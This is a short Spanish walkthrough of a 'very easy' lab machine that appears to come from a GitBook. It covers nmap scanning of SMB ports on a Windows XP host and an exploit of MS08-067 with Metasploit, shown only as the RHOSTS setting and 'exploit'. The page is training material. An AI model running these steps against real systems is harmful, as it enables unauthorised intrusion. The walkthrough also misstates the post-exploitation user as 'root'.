---
description: '🔍 Dificultad: Muy Fácil'
---

# Experience

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.139
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.139 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (3).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los puertos **135, 139 y 445** pertenecientes a servicios de **Microsoft RPC, NetBIOS-SSN y Microsoft-DS** están abiertos, por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p135,139,445 -v 192.168.1.139
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (5).png" alt=""><figcaption></figcaption></figure>

Tenemos un Windows XP. Revisamos el puerto 445.

```bash
nmap -p445 --script="smb-vuln-*" 192.168.1.139
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-01-31 185518.png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Vamos explotar MS08-067 con Metasploit.

```bash
set RHOSTS 192.168.1.139
exploit
```

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
getuid
```

aún somos **root.**

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (3).png" alt=""><figcaption></figcaption></figure>
